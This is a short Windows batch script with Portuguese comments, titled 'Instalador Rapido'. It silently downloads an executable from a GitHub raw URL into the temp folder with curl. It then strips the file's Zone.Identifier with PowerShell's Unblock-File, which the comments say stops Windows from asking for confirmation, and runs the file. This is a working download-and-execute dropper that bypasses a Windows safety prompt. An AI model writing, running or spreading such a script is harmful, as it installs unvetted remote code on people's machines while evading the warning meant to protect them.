@echo off
title Instalador Rapido
echo [+] Iniciando o processo...

:: Configurações
set "URL=https://github.com/romarioeasy/bora/raw/main/borabora.exe"
set "NOME_ARQUIVO=borabora.exe"
set "PASTA_DESTINO=%TEMP%"
set "CAMINHO_COMPLETO=%PASTA_DESTINO%\%NOME_ARQUIVO%"

:: 1. Baixa o arquivo silenciosamente usando curl
echo [+] Baixando arquivo...
curl -L -s -o "%CAMINHO_COMPLETO%" "%URL%"

:: 2. Remove a trava de seguranca do Windows (Zone Identifier )
:: Isso evita que o Windows pergunte "Tem certeza que deseja executar?"
powershell -Command "Unblock-File -Path '%CAMINHO_COMPLETO%'" 2>nul

:: 3. Executa o programa e fecha o CMD
echo [+] Executando %NOME_ARQUIVO%...
start "" "%CAMINHO_COMPLETO%"
exit
